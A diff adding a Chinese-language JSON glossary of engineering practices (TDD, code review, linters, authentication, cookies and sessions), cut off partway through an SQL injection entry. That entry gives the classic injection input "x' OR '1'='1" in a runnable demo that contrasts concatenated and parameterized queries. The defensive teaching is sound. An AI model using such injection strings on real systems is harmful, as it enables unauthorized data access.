@@ -1,0 +1,3741 @@
+[
+ {
+  "slug": "test-driven-development",
+  "def": "测试驱动开发（Test-Driven Development，TDD）是先写一个会失败的测试、再写刚好让它通过的代码、最后重构的开发方法，由 Kent Beck 推广，属于工程实践层，用短小的“红-绿-重构”循环驱动设计，使需求先被表达为可执行的规格。在 AI 编码中，先写测试能给 Agent 明确、可验证的完成标准。",
+  "how": [
+   "红：根据一个小需求写测试，运行确认它因功能缺失而失败，证明测试本身有效。",
+   "绿：编写最少量的实现代码让测试通过，此时不追求优雅或通用，只求变绿。",
+   "重构：在测试保护下改善代码结构、消除重复，保持所有测试通过。",
+   "重复循环，每次只推进一个小行为，逐步扩展测试清单直到需求完成。",
+   "用于 AI 编码时，可先让 Agent 只写测试并确认失败、提交，再要求它实现且不得修改测试。"
+  ],
+  "terms": [
+   {
+    "t": "红-绿-重构 (Red-Green-Refactor)",
+    "d": "TDD 的三步循环：失败、通过、改善结构。"
+   },
+   {
+    "t": "测试清单 (Test List)",
+    "d": "开始前列出待实现行为的清单，逐条转为测试。"
+   },
+   {
+    "t": "三角测量 (Triangulation)",
+    "d": "用多个具体例子逼出通用实现，避免硬编码。"
+   },
+   {
+    "t": "BDD (行为驱动开发)",
+    "d": "以业务语言描述行为的 TDD 变体，如 Given-When-Then。"
+   },
+   {
+    "t": "回归测试 (Regression Test)",
+    "d": "防止已修复问题或已有功能再次出错的测试。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "一次红-绿-重构",
+   "src": "# 第 1 步（红）：先写测试，运行 pytest 会失败（函数尚不存在）\ndef test_slugify_basic():\n    assert slugify(\"Hello World\") == \"hello-world\"\n\ndef test_slugify_strips_symbols():\n    assert slugify(\"  AI & You!  \") == \"ai-you\"\n\n# 第 2 步（绿）：写最少的实现让测试通过\nimport re\n\ndef slugify(text: str) -> str:\n    text = text.strip().lower()\n    text = re.sub(r\"[^a-z0-9]+\", \"-\", text)   # 非字母数字统一成连字符\n    return text.strip(\"-\")\n\n# 第 3 步（重构）：测试保持绿色的前提下改进命名、抽取函数等\n# 新需求（如支持中文）先追加一个失败的测试，再进入下一轮",
+   "note": "测试先于实现存在并先失败，第二个用例逼出了去除符号的通用实现。"
+  },
+  "table": {
+   "title": "TDD 与测试后补对比",
+   "head": [
+    "维度",
+    "TDD",
+    "先写代码后补测试"
+   ],
+   "rows": [
+    [
+     "测试有效性",
+     "先见过失败，确认能抓错",
+     "可能永远不会失败"
+    ],
+    [
+     "设计影响",
+     "倒逼可测试、低耦合",
+     "测试迁就现有实现"
+    ],
+    [
+     "初期速度",
+     "较慢",
+     "较快"
+    ],
+    [
+     "AI 协作",
+     "测试即验收标准",
+     "Agent 易写出迁就性测试"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "严格 TDD",
+    "pros": "设计好、回归保护强",
+    "cons": "需要纪律，探索期显慢",
+    "when": "业务规则明确的核心逻辑"
+   },
+   {
+    "opt": "先探索原型再补测试",
+    "pros": "快速验证可行性",
+    "cons": "原型容易变成生产代码",
+    "when": "技术不确定性高的阶段"
+   },
+   {
+    "opt": "AI 写测试、人审、AI 实现",
+    "pros": "兼顾速度与验收",
+    "cons": "人需认真审测试",
+    "when": "用 Agent 开发功能时"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "测试一写完就直接通过，没见过红",
+    "fix": "必须先运行看到预期的失败，确认测试有效"
+   },
+   {
+    "bad": "一次写一大堆测试再实现",
+    "fix": "一次只推进一个测试，保持循环短小"
+   },
+   {
+    "bad": "跳过重构步骤，代码越积越乱",
+    "fix": "每次变绿后检查重复和命名再继续"
+   },
+   {
+    "bad": "Agent 用硬编码返回值让测试通过",
+    "fix": "增加多组用例三角测量，并审查实现"
+   }
+  ],
+  "checklist": [
+   "每个新行为先有失败的测试",
+   "测试描述行为而非实现",
+   "变绿后执行了重构",
+   "测试文件改动经过审查",
+   "bug 修复先补复现测试",
+   "Agent 被告知不得修改既有测试"
+  ],
+  "interview": [
+   {
+    "q": "为什么 TDD 要求先看到测试失败？",
+    "a": "先失败证明测试确实在检测目标行为，且断言能够抓到错误。如果测试一开始就通过，可能是断言写错、测试没被执行，或者功能早已存在。没有见过红的测试，无法确定它将来能保护你。"
+   },
+   {
+    "q": "TDD 如何影响代码设计？",
+    "a": "先写测试会迫使你从调用方视角设计接口，难以测试的代码通常意味着依赖过多或职责混杂，于是自然倾向依赖注入、小函数和清晰边界。测试成为代码的第一个使用者，暴露出糟糕的 API。"
+   },
+   {
+    "q": "怎么在 AI 编码中实践 TDD？",
+    "a": "分两步：先让 Agent 根据需求写测试，明确说不要写实现，运行确认失败，人审测试后提交；再让 Agent 实现直到测试通过，并禁止修改测试。这样测试成为客观验收标准，防止 Agent 迁就自己的实现。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Martin Fowler: Test Driven Development",
+    "url": "https://martinfowler.com/bliki/TestDrivenDevelopment.html"
+   },
+   {
+    "title": "Kent Beck: Canon TDD",
+    "url": "https://tidyfirst.substack.com/p/canon-tdd"
+   },
+   {
+    "title": "Anthropic: Claude Code best practices",
+    "url": "https://www.anthropic.com/engineering/claude-code-best-practices"
+   }
+  ]
+ },
+ {
+  "slug": "code-review",
+  "def": "代码审查（Code Review）是代码合并前由他人系统检查变更的质量门禁，通常以 Pull Request（GitHub）或 Merge Request（GitLab）形式进行。它属于协作与质量保障层，目标是发现缺陷、保证可维护性、传播知识和统一规范。在 AI 生成代码日益增多的背景下，人类审查是最终责任环节。",
+  "how": [
+   "作者在分支上完成改动，提交 PR 并写明目的、改动范围、测试方式和风险。",
+   "CI 自动运行 lint、类型检查、测试和安全扫描，机器能查的问题先由机器拦截。",
+   "审查者阅读 diff 和上下文，关注正确性、设计、安全、可读性和测试是否充分。",
+   "通过评论提出问题或建议，区分必须修改与可选建议，作者回应并迭代。",
+   "满足审批规则（如至少一人批准、CI 通过、代码所有者认可）后合并。"
+  ],
+  "terms": [
+   {
+    "t": "Pull Request (PR)",
+    "d": "请求将分支合并到目标分支，并承载讨论与审查。"
+   },
+   {
+    "t": "CODEOWNERS",
+    "d": "GitHub 文件，指定路径的负责人，可设为必需审查者。"
+   },
+   {
+    "t": "分支保护 (Branch Protection)",
+    "d": "规定合并前必须满足的审查和检查条件。"
+   },
+   {
+    "t": "Nit",
+    "d": "非阻塞的小建议，如命名、格式偏好。"
+   },
+   {
+    "t": "LGTM",
+    "d": "Looks Good To Me，表示审查通过。"
+   }
+  ],
+  "code": {
+   "lang": "bash",
+   "title": "用 gh CLI 完成审查",
+   "src": "# 作者：创建 PR 并填写说明\ngh pr create --title \"feat: 订单列表分页\" \\\n  --body \"目的: 解决大客户列表超时\n测试: 新增 3 个单测, 本地 pnpm test 通过\n风险: 接口新增可选参数, 向后兼容\"\n\n# 审查者：检出 PR 到本地运行验证\ngh pr checkout 123\npnpm test\n\n# 查看 diff 与 CI 状态\ngh pr diff 123\ngh pr checks 123\n\n# 提交审查结论\ngh pr review 123 --request-changes --body \"分页参数缺少上限校验\"\ngh pr review 123 --approve --body \"LGTM\"",
+   "note": "PR 描述写清目的、测试与风险；审查者本地验证后给出明确结论。"
+  },
+  "table": {
+   "title": "审查关注点优先级",
+   "head": [
+    "优先级",
+    "关注点",
+    "示例"
+   ],
+   "rows": [
+    [
+     "高",
+     "正确性与安全",
+     "越权、注入、数据丢失、竞态"
+    ],
+    [
+     "高",
+     "设计与边界",
+     "职责划分、接口兼容性"
+    ],
+    [
+     "中",
+     "测试充分性",
+     "边界与失败路径是否覆盖"
+    ],
+    [
+     "低",
+     "风格与命名",
+     "应交给 linter 和 formatter"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "强制人工审查所有 PR",
+    "pros": "质量与知识共享好",
+    "cons": "等待时间长",
+    "when": "团队协作、生产代码"
+   },
+   {
+    "opt": "AI 审查辅助 + 人工终审",
+    "pros": "快速发现常见问题",
+    "cons": "存在误报与漏报",
+    "when": "PR 量大、AI 生成代码多"
+   },
+   {
+    "opt": "小 PR 快速合并",
+    "pros": "审查易、冲突少",
+    "cons": "需要拆分功能与特性开关",
+    "when": "持续交付团队"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "上千行的 PR 一次提交",
+    "fix": "拆成可独立审查的小 PR，通常几百行以内"
+   },
+   {
+    "bad": "审查时大量讨论格式问题",
+    "fix": "格式交给自动化工具，人专注逻辑与设计"
+   },
+   {
+    "bad": "AI 生成的代码看起来规范就直接批准",
+    "fix": "同样审查逻辑、边界和安全，并要求附测试"
+   },
+   {
+    "bad": "评论只说“这样不好”",
+    "fix": "说明原因并给出具体建议或替代方案"
+   }
+  ],
+  "checklist": [
+   "PR 描述说明目的、测试和风险",
+   "CI 全部通过",
+   "检查权限与输入校验",
+   "新逻辑有对应测试",
+   "无密钥和调试代码残留",
+   "破坏性变更有迁移说明"
+  ],
+  "interview": [
+   {
+    "q": "代码审查最应该关注什么？",
+    "a": "优先关注机器难以发现的问题：业务逻辑是否正确、边界和错误处理、权限与安全、并发与数据一致性、设计是否合理、是否有足够测试。格式和简单风格问题应交给 linter 和 formatter，避免浪费审查注意力。"
+   },
+   {
+    "q": "如何审查 AI 生成的代码？",
+    "a": "AI 代码通常表面规范但可能存在幻觉 API、遗漏边界、过度实现或与项目约定不一致。审查时要核对调用的接口是否真实存在、检查测试是否真正验证行为、关注安全敏感点，并确认改动范围没有超出需求。"
+   },
+   {
+    "q": "为什么提倡小 PR？",
+    "a": "审查质量随 PR 变大而迅速下降，大 PR 往往只能粗略浏览。小 PR 更容易理解、更快获得反馈、冲突更少、出问题时更易定位和回滚。可以通过分层提交、特性开关等方式把大功能拆小。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "Google Engineering Practices: Code Review",
+    "url": "https://google.github.io/eng-practices/review/"
+   },
+   {
+    "title": "GitHub Docs: About pull request reviews",
+    "url": "https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/about-pull-request-reviews"
+   },
+   {
+    "title": "GitHub Docs: About code owners",
+    "url": "https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners"
+   }
+  ]
+ },
+ {
+  "slug": "linter-and-formatter",
+  "def": "代码检查器（Linter）通过静态分析发现潜在错误、可疑写法和规范违背，如未使用变量、可能的空引用；格式化器（Formatter）只负责统一代码排版，如缩进、换行、引号。二者属于开发工具链的质量层，在编辑器、提交钩子和 CI 中自动运行，是 AI 编码 Agent 获取快速反馈的重要信号。",
+  "how": [
+   "工具把源码解析为抽象语法树（AST），在此基础上分析结构而非简单文本匹配。",
+   "Linter 按规则集遍历 AST，报告问题并标注严重级别，部分规则支持自动修复。",
+   "Formatter 依据 AST 重新输出代码，结果只由代码内容和少量配置决定，与原始排版无关。",
+   "编辑器在保存时运行格式化与检查；提交钩子（如 lint-staged）只处理暂存文件。",
+   "CI 以检查模式运行，发现未格式化或 lint 错误即失败，保证主分支一致。"
+  ],
+  "terms": [
+   {
+    "t": "抽象语法树 (AST)",
+    "d": "源码的树状结构表示，静态分析工具的基础。"
+   },
+   {
+    "t": "ESLint",
+    "d": "JavaScript/TypeScript 主流 Linter，支持插件和自定义规则。"
+   },
+   {
+    "t": "Prettier",
+    "d": "约定优于配置的代码格式化器，可选项刻意很少。"
+   },
+   {
+    "t": "Ruff",
+    "d": "Rust 编写的 Python Linter 与格式化器，速度很快。"
+   },
+   {
+    "t": "lint-staged",
+    "d": "在 Git 提交前只对暂存文件运行检查的工具。"
+   }
+  ],
+  "code": {
+   "lang": "bash",
+   "title": "Python 用 Ruff 检查与格式化",
+   "src": "# 安装\npip install ruff\n\n# 检查问题（未使用导入、未定义变量等）\nruff check .\n\n# 自动修复可安全修复的问题\nruff check . --fix\n\n# 格式化代码（风格兼容 Black）\nruff format .\n\n# CI 中只检查不修改：有未格式化文件则返回非零退出码\nruff format --check .\nruff check . --output-format=github",
+   "note": "同一工具覆盖检查与格式化；CI 使用 --check 模式，本地使用自动修复。"
+  },
+  "table": {
+   "title": "检查器与格式化器分工",
+   "head": [
+    "维度",
+    "Linter",
+    "Formatter"
+   ],
+   "rows": [
+    [
+     "关注点",
+     "潜在错误与代码质量",
+     "排版一致性"
+    ],
+    [
+     "是否改变语义",
+     "自动修复可能改变",
+     "不应改变语义"
+    ],
+    [
+     "可配置性",
+     "规则多、可细调",
+     "选项少"
+    ],
+    [
+     "典型工具",
+     "ESLint、Ruff check",
+     "Prettier、Ruff format、gofmt"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "社区推荐规则集",
+    "pros": "开箱即用，争议少",
+    "cons": "可能有不适合项目的规则",
+    "when": "多数新项目"
+   },
+   {
+    "opt": "高度自定义规则",
+    "pros": "贴合团队习惯",
+    "cons": "维护成本和争论多",
+    "when": "大型团队有明确规范"
+   },
+   {
+    "opt": "提交钩子强制",
+    "pros": "问题不进仓库",
+    "cons": "可被 --no-verify 绕过",
+    "when": "配合 CI 双重保障"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "Linter 的风格规则与 Formatter 冲突",
+    "fix": "关闭 Linter 中的格式类规则，排版交给 Formatter"
+   },
+   {
+    "bad": "大量 eslint-disable 压掉警告",
+    "fix": "修复根因，确需禁用时写明原因并限定范围"
+   },
+   {
+    "bad": "格式化与功能改动混在同一提交",
+    "fix": "单独提交全量格式化，便于审查和 blame"
+   },
+   {
+    "bad": "只在本地运行，CI 不检查",
+    "fix": "CI 中以 check 模式运行并阻止合并"
+   }
+  ],
+  "checklist": [
+   "Linter 与 Formatter 配置入库",
+   "编辑器保存时自动格式化",
+   "提交钩子处理暂存文件",
+   "CI 运行检查模式",
+   "规则禁用需注明原因",
+   "规则文件写明 lint 命令供 Agent 自检"
+  ],
+  "interview": [
+   {
+    "q": "为什么 Linter 和 Formatter 要分开？",
+    "a": "两者目标不同：Formatter 解决排版一致，确定性强、无需讨论；Linter 解决代码质量和潜在错误，需要按项目取舍规则。混用会导致规则冲突和重复报错，社区普遍做法是关闭 Linter 中的格式规则，交给 Formatter 统一处理。"
+   },
+   {
+    "q": "静态分析和类型检查有何区别？",
+    "a": "类型检查基于类型系统证明类型层面的一致性，如参数类型匹配；Linter 基于规则模式发现可疑写法，如未处理的 Promise、可能的逻辑错误。两者互补，TypeScript 项目常同时使用 tsc 与 typescript-eslint。"
+   },
+   {
+    "q": "Linter 对 AI 编码有什么价值？",
+    "a": "它提供秒级、确定性、机器可读的反馈，Agent 能直接根据错误位置和规则名自我修正；统一的格式化也让 AI 生成的 diff 更干净、易审查。把检查命令写进规则文件，让 Agent 每次改动后运行，可显著减少低级错误。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "ESLint Docs",
+    "url": "https://eslint.org/docs/latest/"
+   },
+   {
+    "title": "Prettier: Prettier vs. Linters",
+    "url": "https://prettier.io/docs/en/comparison.html"
+   },
+   {
+    "title": "Ruff Docs",
+    "url": "https://docs.astral.sh/ruff/"
+   }
+  ]
+ },
+ {
+  "slug": "authentication-vs-authorization",
+  "def": "认证（Authentication，AuthN）确认“你是谁”，即验证主体身份；授权（Authorization，AuthZ）决定“你能做什么”，即判断已识别的主体能否对某资源执行某操作。二者属于应用安全的访问控制层，按顺序发生：先认证得到身份，再基于身份、角色或属性做授权判断。混淆两者是越权漏洞的常见根源。",
+  "how": [
+   "认证：用户提交凭证（密码、OTP、通行密钥或第三方登录），服务端验证后确立身份。",
+   "建立会话：服务端签发会话 ID 或令牌，后续请求凭此证明已认证。",
+   "授权：每个请求到达后，服务端根据身份、角色、资源归属等策略判断是否允许操作。",
+   "执行策略：允许则继续处理，否则返回 403，或对隐藏资源返回 404。",
+   "审计：记录认证事件和授权拒绝，用于发现撞库、越权尝试等异常。"
+  ],
+  "terms": [
+   {
+    "t": "多因素认证 (MFA)",
+    "d": "组合多种凭证类型，如密码加一次性验证码。"
+   },
+   {
+    "t": "RBAC (基于角色的访问控制)",
+    "d": "按角色分配权限，用户通过角色获得权限。"
+   },
+   {
+    "t": "ABAC (基于属性的访问控制)",
+    "d": "根据用户、资源、环境属性动态计算是否允许。"
+   },
+   {
+    "t": "通行密钥 (Passkey)",
+    "d": "基于 WebAuthn 公钥凭证的无密码认证方式。"
+   },
+   {
+    "t": "主体 (Principal)",
+    "d": "通过认证的身份实体，可以是用户或服务。"
+   }
+  ],
+  "code": {
+   "lang": "typescript",
+   "title": "Express 中分离认证与授权",
+   "src": "import express from \"express\";\nconst app = express();\n\n// 认证：确定是谁；verifySession 为项目自己的会话校验函数\nfunction authenticate(req, res, next) {\n  const user = verifySession(req.headers.cookie);\n  if (!user) return res.status(401).json({ error: \"unauthenticated\" });\n  req.user = user;\n  next();\n}\n\n// 授权：判断能不能做\nconst requireRole = (role: string) => (req, res, next) =>\n  req.user.roles.includes(role) ? next()\n    : res.status(403).json({ error: \"forbidden\" });\n\napp.delete(\"/admin/users/:id\", authenticate, requireRole(\"admin\"),\n  (req, res) => res.sendStatus(204));\n\napp.get(\"/orders/:id\", authenticate, async (req, res) => {\n  const order = await db.orders.findById(req.params.id);\n  // 资源级授权：只能看自己的订单\n  if (!order || order.userId !== req.user.id) return res.sendStatus(404);\n  res.json(order);\n});",
+   "note": "401 对应认证失败、403 对应授权失败；资源归属检查需在处理函数中完成。"
+  },
+  "table": {
+   "title": "认证与授权对比",
+   "head": [
+    "维度",
+    "认证 AuthN",
+    "授权 AuthZ"
+   ],
+   "rows": [
+    [
+     "回答的问题",
+     "你是谁",
+     "你能做什么"
+    ],
+    [
+     "输入",
+     "凭证",
+     "身份 + 资源 + 操作"
+    ],
+    [
+     "失败状态码",
+     "401",
+     "403（或 404）"
+    ],
+    [
+     "相关标准",
+     "OpenID Connect、WebAuthn",
+     "OAuth 2.0 scope、RBAC/ABAC"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "RBAC",
+    "pros": "简单直观，易审计",
+    "cons": "细粒度需求导致角色爆炸",
+    "when": "权限模型较稳定的系统"
+   },
+   {
+    "opt": "ABAC/策略引擎",
+    "pros": "细粒度、可表达复杂规则",
+    "cons": "策略难调试和审计",
+    "when": "多租户、复杂合规"
+   },
+   {
+    "opt": "托管认证服务",
+    "pros": "省去密码、MFA 实现",
+    "cons": "依赖第三方与费用",
+    "when": "绝大多数中小产品"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "认证通过就认为可以访问任意资源",
+    "fix": "每个资源操作都做归属或权限检查"
+   },
+   {
+    "bad": "前端隐藏按钮当作授权",
+    "fix": "授权必须在服务端执行"
+   },
+   {
+    "bad": "用 OAuth 访问令牌直接当作登录凭证",
+    "fix": "登录使用 OpenID Connect 的 ID Token 并校验受众"
+   },
+   {
+    "bad": "授权逻辑散落在各处、写法不一",
+    "fix": "集中封装授权函数或使用策略库，统一测试"
+   }
+  ],
+  "checklist": [
+   "所有非公开接口都要求认证",
+   "每个资源操作都有授权检查",
+   "401 与 403 区分正确",
+   "管理操作有额外校验或 MFA",
+   "授权规则有自动化测试",
+   "认证与授权拒绝事件有日志"
+  ],
+  "interview": [
+   {
+    "q": "OAuth 2.0 是认证协议吗？",
+    "a": "不是。OAuth 2.0 是授权框架，用于让第三方应用获得访问资源的有限权限，访问令牌不代表用户身份。OpenID Connect 在 OAuth 2.0 之上增加了 ID Token 和用户信息端点，专门解决认证问题，“用某某登录”通常基于 OIDC。"
+   },
+   {
+    "q": "RBAC 和 ABAC 怎么选？",
+    "a": "RBAC 适合权限与岗位对应清晰的场景，简单易审计；当权限需要依赖资源属性（所属部门、状态）、时间或地点等动态条件时，ABAC 更合适。实践中常以 RBAC 为主，在特定资源上叠加属性条件。"
+   },
+   {
+    "q": "如何系统地防止越权？",
+    "a": "默认拒绝；服务端统一的授权层，每个接口显式声明所需权限；数据查询带上租户或用户条件；对资源 ID 做归属校验；编写越权测试用例（用 A 的身份访问 B 的资源）；记录并监控授权拒绝。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Authentication Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+   },
+   {
+    "title": "OWASP Authorization Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+   },
+   {
+    "title": "OpenID Connect Core 1.0",
+    "url": "https://openid.net/specs/openid-connect-core-1_0.html"
+   }
+  ]
+ },
+ {
+  "slug": "cookies-and-sessions",
+  "def": "Cookie 是服务器通过 Set-Cookie 响应头让浏览器保存、并在后续请求中自动携带的小段数据；会话（Session）是服务端为已认证用户维护的状态，通常以随机会话 ID 经 Cookie 关联。二者属于 Web 状态管理层，为无状态的 HTTP 提供“记住登录”的能力，安全属性决定会话劫持与 CSRF 风险。",
+  "how": [
+   "用户登录成功后，服务端生成高熵随机会话 ID，在存储中保存其对应的用户信息和过期时间。",
+   "服务端通过 Set-Cookie 下发会话 ID，并设置 HttpOnly、Secure、SameSite 等属性。",
+   "浏览器按域名、路径和 SameSite 规则，在后续请求中自动附加 Cookie。",
+   "服务端读取会话 ID 并查找会话，得到当前用户；会话过期或不存在则视为未登录。",
+   "登出时服务端删除会话并让 Cookie 失效；登录、提权时应重新生成会话 ID。"
+  ],
+  "terms": [
+   {
+    "t": "HttpOnly",
+    "d": "禁止 JavaScript 读取 Cookie，降低 XSS 窃取会话的风险。"
+   },
+   {
+    "t": "Secure",
+    "d": "只在 HTTPS 连接中发送该 Cookie。"
+   },
+   {
+    "t": "SameSite",
+    "d": "控制跨站请求是否携带 Cookie，取值 Strict、Lax、None。"
+   },
+   {
+    "t": "会话固定 (Session Fixation)",
+    "d": "攻击者让受害者使用已知会话 ID，登录后劫持。"
+   },
+   {
+    "t": "__Host- 前缀",
+    "d": "要求 Secure、Path=/ 且不带 Domain，防止子域覆盖。"
+   }
+  ],
+  "code": {
+   "lang": "http",
+   "title": "安全的会话 Cookie",
+   "src": "POST /login HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\n\n{\"email\": \"a@example.com\", \"password\": \"...\"}\n\nHTTP/1.1 200 OK\nSet-Cookie: __Host-sid=7f3a9c...e21; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=86400\n\n# 之后浏览器自动携带\nGET /api/me HTTP/1.1\nHost: app.example.com\nCookie: __Host-sid=7f3a9c...e21\n\n# 登出：服务端删除会话，并让 Cookie 立即过期\nHTTP/1.1 204 No Content\nSet-Cookie: __Host-sid=; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=0",
+   "note": "会话 ID 只是随机引用；HttpOnly、Secure、SameSite 与 __Host- 前缀共同加固。"
+  },
+  "table": {
+   "title": "SameSite 取值",
+   "head": [
+    "取值",
+    "跨站请求是否携带",
+    "适用"
+   ],
+   "rows": [
+    [
+     "Strict",
+     "任何跨站请求都不带",
+     "银行等高敏感操作"
+    ],
+    [
+     "Lax",
+     "仅顶级导航的 GET 携带",
+     "多数登录会话，现代浏览器常见默认"
+    ],
+    [
+     "None",
+     "都携带，必须同时设置 Secure",
+     "第三方嵌入、跨站 SSO"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "服务端会话 + Cookie",
+    "pros": "可随时吊销，令牌内容不暴露",
+    "cons": "需要会话存储",
+    "when": "传统 Web 应用、同域前后端"
+   },
+   {
+    "opt": "JWT 存于 Cookie",
+    "pros": "无状态校验，易横向扩展",
+    "cons": "吊销困难",
+    "when": "多服务需本地校验身份"
+   },
+   {
+    "opt": "令牌存 localStorage",
+    "pros": "跨域调用简单",
+    "cons": "XSS 可直接窃取",
+    "when": "一般不推荐用于敏感会话"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "会话 Cookie 未设置 HttpOnly",
+    "fix": "会话 Cookie 一律 HttpOnly，前端无需读取"
+   },
+   {
+    "bad": "登录后沿用登录前的会话 ID",
+    "fix": "认证成功后重新生成会话 ID 防止会话固定"
+   },
+   {
+    "bad": "登出只在前端删 Cookie",
+    "fix": "服务端同时销毁会话记录"
+   },
+   {
+    "bad": "Cookie 中直接存用户 ID 或角色",
+    "fix": "只存随机会话 ID，或使用签名并校验"
+   }
+  ],
+  "checklist": [
+   "会话 Cookie 设置 HttpOnly、Secure",
+   "SameSite 策略明确",
+   "会话 ID 由安全随机数生成",
+   "登录和提权后轮换会话 ID",
+   "有空闲超时与绝对超时",
+   "登出时服务端销毁会话"
+  ],
+  "interview": [
+   {
+    "q": "Cookie 和 Session 的关系？",
+    "a": "Cookie 是浏览器端的存储与自动携带机制；Session 是服务端保存的用户状态。典型做法是 Cookie 里只放一个不可猜测的会话 ID，服务端据此查找会话数据。也可以不用服务端会话，而把签名令牌放在 Cookie 中，那就是另一种设计。"
+   },
+   {
+    "q": "SameSite=Lax 能完全防 CSRF 吗？",
+    "a": "不能完全依赖。Lax 阻止了大多数跨站 POST 携带 Cookie，但顶级导航的 GET 仍会携带，若有用 GET 改状态的接口就会被利用；同站的子域被攻破也不受限制；旧浏览器行为不同。仍建议配合 CSRF 令牌或校验 Origin。"
+   },
+   {
+    "q": "为什么推荐 __Host- 前缀？",
+    "a": "浏览器只接受满足 Secure、Path=/ 且没有 Domain 属性的 __Host- Cookie，这样 Cookie 被锁定在当前主机，不能被子域或 HTTP 页面设置或覆盖，可防御通过不安全子域进行的 Cookie 注入和会话固定。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "MDN: Using HTTP cookies",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"
+   },
+   {
+    "title": "OWASP Session Management Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
+   },
+   {
+    "title": "RFC 6265: HTTP State Management Mechanism",
+    "url": "https://www.rfc-editor.org/rfc/rfc6265"
+   }
+  ]
+ },
+ {
+  "slug": "sql-injection",
+  "def": "SQL 注入（SQL Injection）是攻击者通过把恶意 SQL 片段混入应用拼接的查询语句，使数据库执行非预期命令的漏洞，属于 OWASP Top 10 中的注入（Injection）类。它可导致数据泄露、篡改、绕过登录甚至控制服务器。根因是把不可信输入当作代码拼进查询，根本解法是参数化查询。",
+  "how": [
+   "应用把用户输入直接拼接进 SQL 字符串，如 WHERE name = '用户输入'。",
+   "攻击者输入含引号和 SQL 关键字的内容，闭合原有字符串并追加自己的条件或语句。",
+   "数据库解析整个字符串时无法区分开发者写的代码和用户数据，于是执行被篡改的语义。",
+   "常见利用手法有 UNION 查询拼接数据、布尔或时间盲注逐位推断、堆叠查询执行额外语句。",
+   "参数化查询让 SQL 结构与数据分开发送，数据库始终把参数当作值而不是代码。"
+  ],
+  "terms": [
+   {
+    "t": "参数化查询 (Parameterized Query)",
+    "d": "用占位符表示值，值单独绑定，结构无法被改变。"
+   },
+   {
+    "t": "预编译语句 (Prepared Statement)",
+    "d": "先编译 SQL 结构再绑定参数执行，常用于参数化。"
+   },
+   {
+    "t": "盲注 (Blind SQLi)",
+    "d": "页面无直接回显，通过真假响应或延迟推断数据。"
+   },
+   {
+    "t": "ORM",
+    "d": "对象关系映射库，默认参数化，但原生 SQL 接口仍可能注入。"
+   },
+   {
+    "t": "二阶注入 (Second-Order)",
+    "d": "恶意数据先被存储，之后在其他查询中被拼接触发。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "拼接 vs 参数化",
+   "src": "import sqlite3\nconn = sqlite3.connect(\":memory:\")\nconn.execute(\"CREATE TABLE users(name TEXT, role TEXT)\")\nconn.executemany(\"INSERT INTO users VALUES (?, ?)\",\n                 [(\"alice\", \"admin\"), (\"bob\", \"user\")])\n\nname = \"x' OR '1'='1\"   # 攻击者输入\n\n# 错误：字符串拼接，条件被篡改为恒真，返回全部用户\nunsafe = f\"SELECT * FROM users WHERE name = '{name}'\"\nprint(conn.execute(unsafe).fetchall())   # [('alice','admin'), ('bob','user')]\n\n# 正确：参数化，输入只被当作一个普通字符串值\nsafe = conn.execute(\"SELECT * FROM users WHERE name = ?\", (name,))\nprint(safe.fetchall())                    # []\n\n# 表名、排序字段不能参数化，应使用白名单\nsort = \"name\"\nassert sort in {\"name\", \"role\"}\nprint(conn.execute(f\"SELECT * FROM users ORDER BY {sort}\").fetchall())",
+   "note": "可直接运行，对比同一输入在拼接与参数化下的结果；标识符需用白名单。"
+  },
+  "table": {
+   "title": "防御手段对比",
+   "head": [
+    "手段",
+    "效果",
+    "说明"
+   ],
+   "rows": [
+    [
+     "参数化查询",
+     "根本防御",
+     "值与 SQL 结构分离"
+    ],
+    [
+     "标识符白名单",
+     "必需补充",
+     "表名、列名、排序方向无法参数化"
+    ],
+    [
+     "最小权限数据库账号",
+     "降低危害",
+     "应用账号不应有 DROP 等权限"
+    ],
+    [
+     "手工转义/黑名单过滤",
+     "不可靠",
+     "容易遗漏编码与边界情况"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "ORM 查询构建器",
+    "pros": "默认参数化，开发快",
+    "cons": "复杂查询需原生 SQL",
+    "when": "常规 CRUD"
+   },
+   {
+    "opt": "原生 SQL + 参数绑定",
+    "pros": "性能与表达力强",
+    "cons": "需团队纪律",
+    "when": "复杂报表与优化查询"
+   },
+   {
+    "opt": "存储过程",
+    "pros": "权限可收敛到过程",
+    "cons": "内部拼接仍会注入",
+    "when": "强数据库治理环境"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "以为用了 ORM 就绝对安全",
+    "fix": "审查 raw、literal 等原生接口，同样使用参数绑定"
+   },
+   {
+    "bad": "把用户输入拼进 ORDER BY 或表名",
+    "fix": "使用固定白名单映射"
+   },
+   {
+    "bad": "AI 生成的代码用 f-string 拼 SQL",
+    "fix": "在规则文件中禁止拼接，并用 lint 或扫描工具检测"
+   },
+   {
